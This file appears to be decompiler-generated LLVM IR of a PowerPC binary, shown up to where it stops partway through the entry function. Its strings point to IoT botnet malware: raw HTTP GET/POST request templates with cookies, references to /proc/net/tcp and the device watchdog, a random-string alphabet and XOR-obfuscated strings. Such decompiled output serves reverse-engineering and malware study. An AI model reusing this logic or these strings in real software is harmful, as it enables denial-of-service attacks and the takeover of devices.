source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208002121
@global_var_1001b114.3 = global i32 0
@global_var_1001b124.4 = local_unnamed_addr global i32* @global_var_1001b114.3
@global_var_1001b2dc.6 = global i32 0
@global_var_1000a7b8.7 = constant [4 x i8] c"GET\00"
@global_var_1000a7bc.8 = constant i32 788529152
@global_var_10000458.9 = constant [3 x i8] c"8`\00"
@global_var_10000460.10 = constant [3 x i8] c"8`\00"
@global_var_10000468.11 = constant [3 x i8] c"8`\00"
@global_var_10000470.12 = constant [3 x i8] c"8`\00"
@global_var_10000478.13 = constant [3 x i8] c"8`\00"
@global_var_10000480.14 = constant [3 x i8] c"8`\00"
@global_var_10000488.15 = constant [3 x i8] c"8`\00"
@global_var_10000490.16 = constant [3 x i8] c"8`\00"
@global_var_10000498.17 = constant [3 x i8] c"8`\00"
@global_var_100004a0.18 = constant [3 x i8] c"8`\00"
@global_var_10000528.19 = constant i32 939524143
@global_var_1000057c.20 = constant i32 1006685388
@global_var_1000a800.21 = constant i32 -35768
@global_var_100005cc.22 = constant [3 x i8] c"9`\00"
@global_var_1000a7b0.23 = constant i32 536870912
@global_var_1000a7ac.24 = constant [3 x i8] c"\0D\0A\00"
@global_var_100006c0.25 = constant [3 x i8] c"8`\00"
@global_var_1000a788.26 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1000a7a0.27 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_10000984.28 = constant [3 x i8] c"8`\00"
@global_var_100009b0.29 = constant [3 x i8] c"8`\00"
@global_var_100009cc.30 = constant [3 x i8] c"8`\00"
@global_var_100009f8.31 = constant [3 x i8] c"8`\00"
@global_var_10000a14.32 = constant [3 x i8] c"8`\00"
@global_var_10000a40.33 = constant [3 x i8] c"8`\00"
@global_var_10000a8c.34 = constant [3 x i8] c"8`\00"
@global_var_1000a7c0.35 = constant [9 x i8] c"Cookie: \00"
@global_var_1000a7cc.36 = constant [3 x i8] c"; \00"
@global_var_1000a7d0.37 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10000d08.38 = constant i32 939524096
@global_var_1000a7d8.39 = constant i32 989855744
@global_var_1000a7dc.40 = constant [5 x i8] c"http\00"
@global_var_100014f8.41 = constant i32 939589631
@global_var_10001560.42 = constant i32 939589631
@global_var_1000a7e4.43 = constant [5 x i8] c"url=\00"
@global_var_10001710.44 = constant [3 x i8] c"8`\00"
@global_var_1000a7ec.45 = constant [5 x i8] c"POST\00"
@global_var_10001824.46 = constant [3 x i8] c"9`\00"
@global_var_1000a7f4.47 = constant i32 654311424
@global_var_10001b24.49 = constant [3 x i8] c"9`\00"
@global_var_1000a7f8.50 = constant i32 1023410176
@global_var_10001e2c.56 = constant i32 1207984149
@global_var_10001e38.57 = constant [3 x i8] c"8`\00"
@global_var_1001b290.59 = local_unnamed_addr global i32 0
@global_var_100020a0.60 = constant [3 x i8] c";{\00"
@global_var_100020cc.61 = constant i32 939524096
@global_var_1001b288.63 = local_unnamed_addr global i32 0
@global_var_10002970.64 = constant [3 x i8] c"8~\00"
@global_var_10002980.65 = constant [3 x i8] c"8~\00"
@global_var_10002990.66 = constant [3 x i8] c"8~\00"
@global_var_100032f8.67 = constant [3 x i8] c"8`\00"
@global_var_10003fac.68 = constant i32 939524104
@global_var_10003fdc.69 = constant i32 939524096
@global_var_100042dc.70 = constant i32 939524096
@global_var_10004aec.71 = constant [3 x i8] c"8`\00"
@global_var_10004af4.72 = constant [3 x i8] c"8`\00"
@global_var_1000a814.73 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_10004bf0.74 = constant [3 x i8] c"9@\00"
@global_var_10004f38.75 = constant [3 x i8] c"8`\00"
@global_var_10004f40.76 = constant [3 x i8] c"8`\00"
@global_var_10004f48.77 = constant [3 x i8] c"8`\00"
@global_var_10004f50.78 = constant [3 x i8] c"8`\00"
@global_var_10004fbc.79 = constant [3 x i8] c"8`\00"
@global_var_10004fc4.80 = constant [3 x i8] c"8`\00"
@global_var_1001b29c.81 = local_unnamed_addr global i32 0
@global_var_100050fc.82 = constant i32 939524119
@global_var_10005138.83 = constant [3 x i8] c"8`\00"
@global_var_1001b294.84 = local_unnamed_addr global i32 0
@global_var_1001b298.85 = local_unnamed_addr global i32 0
@global_var_1000516c.86 = constant [3 x i8] c"8`\00"
@global_var_100051e8.87 = constant [3 x i8] c"8`\00"
@global_var_100051f0.88 = constant [3 x i8] c"8`\00"
@global_var_10005254.89 = constant i32 1207971937
@global_var_100052f0.90 = constant [3 x i8] c"8`\00"
@global_var_10005380.91 = constant [3 x i8] c"8`\00"
@global_var_10005388.92 = constant [3 x i8] c"8`\00"
@global_var_100053f8.93 = constant [3 x i8] c"8`\00"
@global_var_10005400.94 = constant i32 1207970297
@global_var_100054b0.95 = constant [3 x i8] c"8`\00"
@global_var_100054b8.96 = constant [3 x i8] c"8`\00"
@global_var_100054c0.97 = constant [3 x i8] c"8`\00"
@global_var_100054c8.98 = constant [3 x i8] c"8`\00"
@global_var_10005698.99 = constant [3 x i8] c"8`\00"
@global_var_100056a0.100 = constant [3 x i8] c"8`\00"
@global_var_100056a8.101 = constant [3 x i8] c"8`\00"
@global_var_100056b0.102 = constant [3 x i8] c"8`\00"
@global_var_100056e8.103 = constant [3 x i8] c"8`\00"
@global_var_10005740.104 = constant [3 x i8] c"8`\00"
@global_var_10005748.105 = constant [3 x i8] c"8`\00"
@global_var_10005750.106 = constant [3 x i8] c"8`\00"
@global_var_10005758.107 = constant [3 x i8] c"8`\00"
@global_var_1001b270.108 = local_unnamed_addr global i32 268466144
@global_var_1001b268.109 = local_unnamed_addr global i32 -1
@global_var_10005910.111 = constant [3 x i8] c"8`\00"
@global_var_10005920.112 = constant [3 x i8] c"8`\00"
@global_var_10005998.113 = constant i32 1207962877
@global_var_1001b31c.114 = global i32 0
@global_var_1001b320.115 = local_unnamed_addr global i32 0
@global_var_100059e8.116 = constant [3 x i8] c"8`\00"
@global_var_100059f0.117 = constant [3 x i8] c"8`\00"
@global_var_1001b31e.118 = local_unnamed_addr global i32 0
@global_var_1000a824.119 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1000a854.125 = constant i32 268457856
@global_var_10005b98.126 = constant i32 939524103
@global_var_10005c9c.127 = constant i32 1207961293
@global_var_10005ce8.128 = constant i32 1207961137
@global_var_10005cec.129 = constant i32 1006676650
@global_var_10005d34.130 = constant [3 x i8] c"8`\00"
@global_var_1000a848.131 = constant i32 167772160
@global_var_10005d6c.132 = constant [3 x i8] c"8`\00"
@global_var_10005d74.133 = constant i32 1207967805
@global_var_1000a834.134 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_10005e04.135 = constant [3 x i8] c"8`\00"
@global_var_10005e0c.136 = constant [3 x i8] c"8`\00"
@global_var_10005e14.137 = constant [3 x i8] c"8`\00"
@global_var_1001b26c.138 = local_unnamed_addr global i32 -1
@global_var_10005fdc.140 = constant i32 939589631
@global_var_100060c4.141 = constant i32 939589631
@global_var_100061a4.142 = constant i32 939589631
@global_var_100061b0.143 = constant i32 1006685388
@global_var_1000a84c.144 = constant i32 1
@global_var_1001b300.145 = local_unnamed_addr global i32 0
@global_var_1001b2f4.146 = local_unnamed_addr global i32 0
@global_var_1001b2fc.147 = local_unnamed_addr global i32 0
@global_var_1001b2f8.148 = local_unnamed_addr global i32 0
@global_var_1000a88c.149 = constant [33 x i8] c"7cliftvqm1ugnkbej08owar2phd35s64\00"
@global_var_10006700.150 = constant [3 x i8] c"9A\00"
@global_var_10006784.151 = constant i32 939524096
@global_var_100067b8.152 = constant i32 1006665728
@global_var_100067e4.153 = constant i32 939524098
@global_var_1000682c.154 = constant [3 x i8] c"8`\00"
@global_var_100068a0.155 = constant i32 939524128
@global_var_1000694c.156 = constant [3 x i8] c"8c\00"
@global_var_1001b32c.157 = global i32 0
@global_var_1001b274.158 = local_unnamed_addr global i32 -1095770451
@global_var_1000a8b0.159 = constant i32 89066831
@global_var_10006d60.160 = constant [3 x i8] c"8`\00"
@global_var_1001b344.161 = local_unnamed_addr global i32 0
@global_var_1001b348.162 = local_unnamed_addr global i32 0
@global_var_1000a8c0.163 = constant [3 x i8] c"m?\00"
@global_var_10006d84.164 = constant [3 x i8] c"8`\00"
@global_var_1001b34c.165 = local_unnamed_addr global i32 0
@global_var_1001b350.166 = local_unnamed_addr global i32 0
@global_var_10006da4.167 = constant [3 x i8] c"8`\00"
@global_var_1001b3bc.168 = local_unnamed_addr global i32 0
@global_var_1001b3c0.169 = local_unnamed_addr global i32 0
@global_var_1000a8c4.170 = constant i32 -645464064
@global_var_10006dc8.171 = constant [3 x i8] c"8`\00"
@global_var_1001b3c4.172 = local_unnamed_addr global i32 0
@global_var_1001b3c8.173 = local_unnamed_addr global i32 0
@global_var_1000a8c8.174 = constant i32 235606294
@global_var_10006df4.175 = constant [3 x i8] c"8`\00"
@global_var_1001b33c.176 = local_unnamed_addr global i32 0
@global_var_1001b340.177 = local_unnamed_addr global i32 0
@global_var_1000ab04.178 = constant i32 169219602
@global_var_10006e18.179 = constant i32 939524125
@global_var_1001b358.180 = local_unnamed_addr global i32 0
@global_var_1001b354.181 = local_unnamed_addr global i32 0
@global_var_1000a8d4.182 = constant i32 1293029389
@global_var_10006e40.183 = constant [3 x i8] c"8`\00"
@global_var_1001b35c.184 = local_unnamed_addr global i32 0
@global_var_1001b360.185 = local_unnamed_addr global i32 0
@global_var_1000a8dc.186 = constant i32 1292311047
@global_var_10006e68.187 = constant i32 939524101
@global_var_1001b368.188 = local_unnamed_addr global i32 0
@global_var_1001b364.189 = local_unnamed_addr global i32 0
@global_var_1000a8e4.190 = constant i32 1241909006
@global_var_10006e90.191 = constant [3 x i8] c"8`\00"
@global_var_1001b36c.192 = local_unnamed_addr global i32 0
@global_var_1001b370.193 = local_unnamed_addr global i32 0
@global_var_1000a8f0.194 = constant i32 1292109410
@global_var_10006eb4.195 = constant i32 939524100
@global_var_1001b378.196 = local_unnamed_addr global i32 0
@global_var_1001b374.197 = local_unnamed_addr global i32 0
@global_var_1000a8f8.198 = constant i32 1275268107
@global_var_10006edc.199 = constant [3 x i8] c"8`\00"
@global_var_1001b37c.200 = local_unnamed_addr global i32 0
@global_var_1001b380.201 = local_unnamed_addr global i32 0
@global_var_1000a900.202 = constant i32 1292965379
@global_var_10006f00.203 = constant [3 x i8] c"8`\00"
@global_var_1001b384.204 = local_unnamed_addr global i32 0
@global_var_1001b388.205 = local_unnamed_addr global i32 0
@global_var_1000a90c.206 = constant i32 807875117
@global_var_10006f24.207 = constant i32 939524109
@global_var_1001b390.208 = local_unnamed_addr global i32 0
@global_var_1001b38c.209 = local_unnamed_addr global i32 0
@global_var_1000a91c.210 = constant [11 x i8] c"*662$.--&b\00"
@global_var_10006f4c.211 = constant [3 x i8] c"8`\00"
@global_var_1001b394.212 = local_unnamed_addr global i32 0
@global_var_1001b398.213 = local_unnamed_addr global i32 0
@global_var_1000a928.214 = constant [11 x i8] c".-.,-%6$-b\00"
@global_var_10006f70.215 = constant [3 x i8] c"8`\00"
@global_var_1001b39c.216 = local_unnamed_addr global i32 0
@global_var_1001b3a0.217 = local_unnamed_addr global i32 0
@global_var_1000a934.218 = constant i32 1041912666
@global_var_10006f94.219 = constant i32 939524129
@global_var_1001b3a8.220 = local_unnamed_addr global i32 0
@global_var_1001b3a4.221 = local_unnamed_addr global i32 0
@global_var_1000a958.222 = constant i32 403508750
@global_var_10006fbc.223 = constant [3 x i8] c"8`\00"
@global_var_1001b3ac.224 = local_unnamed_addr global i32 0
@global_var_1001b3b0.225 = local_unnamed_addr global i32 0
@global_var_1000a964.226 = constant [12 x i8] c"%'6.-!#.+2b\00"
@global_var_10006fe0.227 = constant [3 x i8] c"8`\00"
@global_var_1001b3b4.228 = local_unnamed_addr global i32 0
@global_var_1001b3b8.229 = local_unnamed_addr global i32 0
@global_var_1000a970.230 = constant i32 285869838
@global_var_10007004.231 = constant i32 939524102
@global_var_1001b3d0.232 = local_unnamed_addr global i32 0
@global_var_1001b3cc.233 = local_unnamed_addr global i32 0
@global_var_1000ab24.234 = constant i32 118227712
@global_var_1000702c.235 = constant [3 x i8] c"8`\00"
@global_var_1001b3d4.236 = local_unnamed_addr global i32 0
@global_var_1001b3d8.237 = local_unnamed_addr global i32 0
@global_var_1000a978.238 = constant i32 286986518
@global_var_10007050.239 = constant [3 x i8] c"8`\00"
@global_var_1001b3dc.240 = local_unnamed_addr global i32 0
@global_var_1001b3e0.241 = local_unnamed_addr global i32 0
@global_var_1000a980.242 = constant i32 285893120
@global_var_10007074.243 = constant i32 939524099
@global_var_1001b3e8.244 = local_unnamed_addr global i32 0
@global_var_1001b3e4.245 = local_unnamed_addr global i32 0
@global_var_1000ab2c.246 = constant i32 1291848460
@global_var_1000709c.247 = constant [3 x i8] c"8`\00"
@global_var_1001b3ec.248 = local_unnamed_addr global i32 0
@global_var_1001b3f0.249 = local_unnamed_addr global i32 0
@global_var_1000a984.250 = constant i32 791359523
@global_var_100070c4.251 = constant i32 939524120
@global_var_1001b3f8.252 = local_unnamed_addr global i32 0
@global_var_1001b3f4.253 = local_unnamed_addr global i32 0
@global_var_1000a9a0.254 = constant i32 201395472
@global_var_100070ec.255 = constant [3 x i8] c"8`\00"
@global_var_1001b3fc.256 = local_unnamed_addr global i32 0
@global_var_1001b400.257 = local_unnamed_addr global i32 0
@global_var_1000ab40.258 = constant i32 1291848460
@global_var_10007110.259 = constant [3 x i8] c"8`\00"
@global_var_1001b404.260 = local_unnamed_addr global i32 0
@global_var_1001b408.261 = local_unnamed_addr global i32 0
@global_var_1000ab54.262 = constant i32 1291848460
@global_var_10007134.263 = constant i32 939524118
@global_var_1001b410.264 = local_unnamed_addr global i32 0
@global_var_1001b40c.265 = local_unnamed_addr global i32 0
@global_var_1000a9ac.266 = constant i32 909184279
@global_var_1000715c.267 = constant i32 939524117
@global_var_1001b418.268 = local_unnamed_addr global i32 0
@global_var_1001b414.269 = local_unnamed_addr global i32 0
@global_var_1000a9c4.270 = constant i32 1292310017
@global_var_10007184.271 = constant i32 939524113
@global_var_1001b420.272 = local_unnamed_addr global i32 0
@global_var_1001b41c.273 = local_unnamed_addr global i32 0
@global_var_1000a9d8.274 = constant i32 201527047
@global_var_100071ac.275 = constant [3 x i8] c"8`\00"
@global_var_1001b424.276 = local_unnamed_addr global i32 0
@global_var_1001b428.277 = local_unnamed_addr global i32 0
@global_var_1000a9e8.278 = constant i32 554503180
@global_var_100071d0.279 = constant i32 939524119
@global_var_1001b430.280 = local_unnamed_addr global i32 0
@global_var_1001b42c.281 = local_unnamed_addr global i32 0
@global_var_1000ab6c.282 = constant i32 587268359
@global_var_100071f8.283 = constant i32 939524179
@global_var_1001b438.284 = local_unnamed_addr global i32 0
@global_var_1001b434.285 = local_unnamed_addr global i32 0
@global_var_1000aa00.286 = constant i32 587268359
@global_var_10007220.287 = constant i32 939524128
@global_var_1001b440.288 = local_unnamed_addr global i32 0
@global_var_1001b43c.289 = local_unnamed_addr global i32 0
@global_var_1000aa24.290 = constant i32 554503190
@global_var_10007248.291 = constant i32 939524144
@global_var_1001b448.292 = local_unnamed_addr global i32 0
@global_var_1001b444.293 = local_unnamed_addr global i32 0
@global_var_1000aa58.294 = constant i32 285677089
@global_var_10007270.295 = constant [3 x i8] c"8`\00"
@global_var_1001b44c.296 = local_unnamed_addr global i32 0
@global_var_1001b450.297 = local_unnamed_addr global i32 0
@global_var_1000aa68.298 = constant i32 268895248
@global_var_10007294.299 = constant [3 x i8] c"8`\00"
@global_var_1001b454.300 = local_unnamed_addr global i32 0
@global_var_1001b458.301 = local_unnamed_addr global i32 0
@global_var_1000aa74.302 = constant i32 235733251
@global_var_100072b8.303 = constant [3 x i8] c"8`\00"
@global_var_1001b45c.304 = local_unnamed_addr global i32 0
@global_var_1001b460.305 = local_unnamed_addr global i32 0
@global_var_1000aa80.306 = constant i32 285677135
@global_var_100072dc.307 = constant [3 x i8] c"8`\00"
@global_var_1001b464.308 = local_unnamed_addr global i32 0
@global_var_1001b468.309 = local_unnamed_addr global i32 0
@global_var_1000aa90.310 = constant i32 17632278
@global_var_10007300.311 = constant [3 x i8] c"8`\00"
@global_var_1001b46c.312 = local_unnamed_addr global i32 0
@global_var_1001b470.313 = local_unnamed_addr global i32 0
@global_var_1000aaa4.314 = constant i32 370148108
@global_var_10007324.315 = constant [3 x i8] c"8`\00"
@global_var_1001b474.316 = local_unnamed_addr global i32 0
@global_var_1001b478.317 = local_unnamed_addr global i32 0
@global_var_1000aab8.318 = constant i32 17438476
@global_var_10007348.319 = constant [3 x i8] c"8`\00"
@global_var_1001b47c.320 = local_unnamed_addr global i32 0
@global_var_1001b480.321 = local_unnamed_addr global i32 0
@global_var_1000a9f4.322 = constant i32 151455506
@global_var_1000736c.323 = constant [3 x i8] c"8`\00"
@global_var_1001b484.324 = local_unnamed_addr global i32 0
@global_var_1001b488.325 = local_unnamed_addr global i32 0
@global_var_1000aac4.326 = constant i32 17632268
@global_var_10007390.327 = constant [3 x i8] c"8`\00"
@global_var_1001b48c.328 = local_unnamed_addr global i32 0
@global_var_1001b490.329 = local_unnamed_addr global i32 0
@global_var_1000aad4.330 = constant i32 285675540
@global_var_100073b4.331 = constant i32 939524114
@global_var_1001b498.332 = local_unnamed_addr global i32 0
@global_var_1001b494.333 = local_unnamed_addr global i32 0
@global_var_1000aae8.334 = constant i32 285675540
@global_var_100073dc.335 = constant i32 939524121
@global_var_1001b4a0.336 = local_unnamed_addr global i32 0
@global_var_1001b49c.337 = local_unnamed_addr global i32 0
@global_var_1000abc0.338 = constant i32 789387275
@global_var_10007408.339 = constant [3 x i8] c"8`\00"
@global_var_1001b4a4.340 = local_unnamed_addr global i32 0
@global_var_1001b4a8.341 = local_unnamed_addr global i32 0
@global_var_1000ac30.342 = constant i32 789387275
@global_var_1000742c.343 = constant [3 x i8] c"8`\00"
@global_var_1001b4ac.344 = local_unnamed_addr global i32 0
@global_var_1001b4b0.345 = local_unnamed_addr global i32 0
@global_var_1000aca0.346 = constant i32 789387275
@global_var_10007454.347 = constant [3 x i8] c"8`\00"
@global_var_1001b4b4.348 = local_unnamed_addr global i32 0
@global_var_1001b4b8.349 = local_unnamed_addr global i32 0
@global_var_1000ad10.350 = constant i32 789387275
@global_var_10007478.351 = constant [3 x i8] c"8`\00"
@global_var_1001b4bc.352 = local_unnamed_addr global i32 0
@global_var_1001b4c0.353 = local_unnamed_addr global i32 0
@global_var_1000ad80.354 = constant i32 789387275
@global_var_1000749c.355 = constant i32 939524213
@global_var_1001b4c8.356 = local_unnamed_addr global i32 0
@global_var_1001b4c4.357 = local_unnamed_addr global i32 0
@global_var_10007804.358 = constant i32 939524096
@global_var_10007bd0.359 = constant i32 1207959564
@global_var_100080f4.360 = constant i32 939524118
@global_var_100098c4.361 = constant [3 x i8] c"8`\00"
@global_var_1000824c.362 = constant i32 939524105
@global_var_10008268.363 = constant i32 939589631
@global_var_10008390.364 = constant i32 1207959797
@global_var_10008394.365 = constant i32 939524108
@global_var_1001b2c0.366 = global i32 0
@global_var_10008bb8.367 = constant i32 939524118
@global_var_10008c40.368 = constant i32 939524118
@global_var_1001b4cc.369 = global i32 0
@global_var_1001b304.370 = global i32 0
@global_var_1001b278 = external global i32
@global_var_1000af04.373 = constant i32 33554944
@global_var_1001b2b0.374 = local_unnamed_addr global i32 0
@global_var_1001b54c.375 = global i32 0
@global_var_10008e9c.376 = constant i32 939524108
@global_var_10008ef0.377 = constant i32 939524108
@global_var_10008fa4.378 = constant [3 x i8] c"8`\00"
@global_var_10009050.379 = constant [3 x i8] c"8`\00"
@global_var_10009378.380 = constant i32 1207959640
@global_var_100093b4.381 = constant i32 1207959580
@global_var_1001b284.382 = local_unnamed_addr global i32* @global_var_1000af04.373
@global_var_100095a8.383 = constant i32 939524130
@global_var_1001b238.384 = global i32 0
@global_var_1001b2a4.385 = local_unnamed_addr global i32 0
@global_var_1000963c.386 = constant i32 1207960053
@global_var_10009640.387 = constant [3 x i8] c"= \00"
@global_var_1001b108.388 = global i32 -1
@global_var_1001b2b4.389 = local_unnamed_addr global i32 0
@global_var_1001b2b8.390 = local_unnamed_addr global i32 0
@global_var_1000adf8.391 = constant [10 x i8] c"/dev/null\00"
@global_var_1001b2bc.392 = local_unnamed_addr global i32 0
@global_var_1001b2a8.394 = local_unnamed_addr global i32 0
@global_var_1001b2ac.395 = local_unnamed_addr global i32 0
@global_var_10009bdc.396 = constant i32 939524096
@global_var_10009e68.398 = constant i32 939524118
@global_var_1000a064.399 = constant i32 939589631
@global_var_1001b2d4.400 = local_unnamed_addr global i32 0
@global_var_1001b250.401 = global i32 0
@global_var_1000a4ec.402 = constant i32 939524129
@global_var_1001b2c8.403 = local_unnamed_addr global i32 0
@global_var_1000a560.404 = constant [3 x i8] c"8`\00"
@global_var_1000a598.405 = constant i32 939524129
@global_var_1001b2cc.406 = local_unnamed_addr global i32 0
@global_var_1001b2d0.407 = local_unnamed_addr global i32 0
@global_var_1001b10c.408 = global i32 0
@global_var_1001b2d8.2 = local_unnamed_addr global i8 0
@global_var_1001b28c.58 = local_unnamed_addr global i8 0
@global_var_1001b28d.62 = global i8 0
@global_var_1001b128.110 = local_unnamed_addr global i8 1
@global_var_1001b2a0.139 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000a6ec(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1001b2d8.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001b124.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001b124.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001b124.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1001b2d8.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1001b2d8.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 268546328 to i32*), align 8
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 268546328
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r16.global-to-local, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %lr.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_10000210, i32* %r4.global-to-local, align 4
  %v2_10000214 = ptrtoint i32* %stack_var_4 to i32
  store i32 268458536, i32* %r3.global-to-local, align 4
  %v7_10000234 = call i32 @function_100099b0(i32 268458536, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268478296, i32 %arg1)
  store i32 %v7_10000234, i32* %r3.global-to-local, align 4
  %v0_10000238 = load i32, i32* @r1, align 4
  %v2_10000238 = add i32 %v0_10000238, -20896
  %v3_10000238 = inttoptr i32 %v2_10000238 to i32*
  store i32 %v0_10000238, i32* %v3_10000238, align 4
  %v0_1000023c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_1000023c, i32* %r0.global-to-local, align 4
  %v0_10000240 = call i32 @__asm_mfcr()
  %v0_10000244 = load i32, i32* @r29, align 4
  %v1_10000244 = load i32, i32* @r1, align 4
  %v2_10000244 = add i32 %v1_10000244, 20884
  %v3_10000244 = inttoptr i32 %v2_10000244 to i32*
  store i32 %v0_10000244, i32* %v3_10000244, align 4
  store i32 %v2_10000214, i32* %r29.global-to-local, align 4
  %v0_1000024c = load i32, i32* @r22, align 4
  %v1_1000024c = load i32, i32* @r1, align 4
  %v2_1000024c = add i32 %v1_1000024c, 20856
  %v3_1000024c = inttoptr i32 %v2_1000024c to i32*
  store i32 %v0_1000024c, i32* %v3_1000024c, align 4
  %v0_10000254 = load i32, i32* @r23, align 4
  %v1_10000254 = load i32, i32* @r1, align 4
  %v2_10000254 = add i32 %v1_10000254, 20860
  %v3_10000254 = inttoptr i32 %v2_10000254 to i32*
  store i32 %v0_10000254, i32* %v3_10000254, align 4
  store i32 %v2_10000210, i32* %r22.global-to-local, align 4
  %v0_1000025c = load i32, i32* @r28, align 4
  %v1_1000025c = load i32, i32* @r1, align 4
  %v2_1000025c = add i32 %v1_1000025c, 20880
